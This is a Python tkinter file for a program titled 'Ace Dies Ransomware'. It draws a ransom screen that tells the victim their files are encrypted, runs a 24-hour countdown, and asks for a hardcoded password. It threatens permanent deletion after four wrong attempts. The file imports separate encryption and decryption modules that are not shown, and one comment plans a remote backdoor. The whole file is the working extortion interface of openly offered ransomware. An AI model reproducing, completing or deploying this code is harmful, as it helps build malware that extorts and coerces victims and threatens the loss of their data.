from tkinter import *
from tkinter import messagebox
from tkinter import ttk
from robin import robin
from ransom_image_data import ransom_image
from decrypt import decrypted
from PIL import ImageTk
import time
import io
import base64 


def timer(time):
    hours, minutes, seconds =  time.split(":")
    hours = int(hours)
    minutes = int(minutes)
    seconds =  int(seconds)
    label['text'] = '{}:{}:{}'.format(hours, minutes, seconds)
    label['anchor'] = N
    
    if seconds > 0 or minutes > 0 or hours > 0:
        if seconds > 0:
            seconds -= 1
        elif minutes > 0:
            minutes -= 1
            seconds = 59
        elif hours > 0:
            hours -= 1 
            minutes = 59
            seconds = 59
        root.after(1000, timer, '{}:{}:{}'.format(hours, minutes, seconds))


def clicked():
    global attempts
    global count
    count += 1
    careful = "Careful. You have {} attempts before your files are permanently deleted".format(attempts)
    while attempts > 0:
        if w.get() == '' or w.get() != "metallica":
            attempts -= 1
            messagebox.showwarning("HAHA INCORRECT", careful.format(attempts))
            break
        elif w.get() == "metallica":
            messagebox.showinfo("Decrypted", "Your files will be decrypting now! Thank you for your cooperation!")
            #decrypted
            #create a backdoor to come back to files remotely!!
            time.sleep(1)
            exit()
    if count == 5:
        messagebox.showerror("ERROR", "Your files are gone forever")
        #decrypted
        time.sleep(1)

width, height = 800, 800
root = Tk()
pw = []
count = 0
attempts = 4
#robin()
root.resizable(False, False)
root.title("Ace Dies Ransomware")
label = Label(root, font = ('calibri', 25, 'bold'), bg = "#D2042D")
label.pack(anchor=CENTER)
labelInfected = Label(root, text = 'YOU HAVE BEEN INFECTED', font=('calibri', 30, 'bold'), bg = "#D2042D", anchor=N, justify=CENTER )
labelInfected.pack()
timer("24:00:00")
message = """Hello. All of your files have been encrypted. 
Please type in the correct password to decrypt your files. 
You will not be able to receive your files without 
the password. Sorry."""
root['background'] = "#D2042D"
root.geometry(str(width) + "x" + str(height))
messVar = Label(root, text = message, font=('calibri', 18,'bold'), justify=CENTER)
messVar.config(bg = "#D2042D")
messVar.bind("<Configure>", lambda e: messVar.configure(width=e.width-10))
messVar.pack(expand=True, fill = "x", anchor= N)


img = ransom_image()
resized = img.resize((400, 400))

test = ImageTk.PhotoImage(resized)
label1 = Label(image = test)
label1.image = test
# Position image
label1.place(x=width/3 - 60 , y=height/3 - 25)
for i in range(1, 5):
    w = Entry(root)
w.pack(padx=50)
button = Button(root, text = 'Send', command=clicked, width=10)
button.pack(pady=50)



root.mainloop()
